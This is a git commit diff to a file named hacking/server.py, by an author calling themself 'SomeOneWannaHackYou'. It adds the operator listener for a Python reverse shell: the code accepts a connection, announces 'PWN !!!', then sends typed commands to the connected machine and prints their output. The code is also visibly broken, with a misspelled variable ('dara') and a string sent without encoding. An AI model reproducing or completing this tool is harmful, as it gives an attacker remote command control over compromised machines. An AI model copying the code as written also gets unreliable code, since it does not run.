fd8e67145c616af663aba4e8710ec917cb85423b
SomeOneWannaHackYou <95560177+ILOVEPYTHONSOMUCH@users.noreply.github.com>
2022-07-12 10:42:30 +0700

    Update server.py

--- hacking/server.py
+++ hacking/server.py
@@ -1,3 +1,4 @@
+# Simple python revshell
 import socket
 ip = "" # enter ip
 port = 1337
@@ -6,10 +7,20 @@ s.bind((ip, port))
 s.listen()
 while True:
   data, addr = s.accept()
+  data.settimeout(2)
   if data != "":
     print("Connected by ",addr)
     print("PWN !!! on port", port)
+    print("Shell exploit...................")
     while True:
-      
+      path = data.recv(1024).decode("utf-8")
+      cmd = input(f"{path}>")
+      if cmd == 'exit':
+        data.close()
+        s.close()
+        exit()
+      data.send(cmd)
+      output = dara.recv(4096).decode("utf-8")
+      print(output)
       
       
